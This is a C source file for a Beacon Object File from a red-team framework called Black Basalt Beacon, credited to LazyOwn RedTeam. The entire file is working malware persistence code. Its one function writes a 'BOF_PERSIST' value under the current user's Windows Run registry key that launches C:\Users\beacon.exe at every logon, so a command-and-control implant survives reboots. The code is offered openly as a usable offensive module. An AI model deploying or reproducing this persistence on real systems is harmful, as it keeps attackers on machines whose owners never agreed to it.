/*
	This file is part of Black Basalt Beacon.

	Black Basalt Beacon is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Black Basalt Beacon is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with Black Basalt Beacon.  If not, see <https://www.gnu.org/licenses/>.

	Copyright (c) LazyOwn RedTeam 2025. All rights reserved.
*/

#include <windows.h>
#include "beacon.h"

extern PVOID __imp_RegOpenKeyExA;
extern PVOID __imp_RegSetValueExA;
extern PVOID __imp_RegCloseKey;

void go(char *args, int alen) {
    HKEY hKey;
    LONG result = ((LONG(WINAPI*)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY))__imp_RegOpenKeyExA)(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExA falló: %ld\n", result);
        return;
    }

    char valueData[] = "C:\\Users\\beacon.exe";
    result = ((LONG(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD))__imp_RegSetValueExA)(
        hKey,
        "BOF_PERSIST",
        0,
        REG_SZ,
        (const BYTE*)valueData,
        strlen(valueData) + 1
    );

    if (result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegSetValueExA falló: %ld\n", result);
        ((LONG(WINAPI*)(HKEY))__imp_RegCloseKey)(hKey);
        return;
    }

    ((LONG(WINAPI*)(HKEY))__imp_RegCloseKey)(hKey);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Valor de registro creado/actualizado: HKCU\\...\\Run\\BOF_PERSIST\n");
}
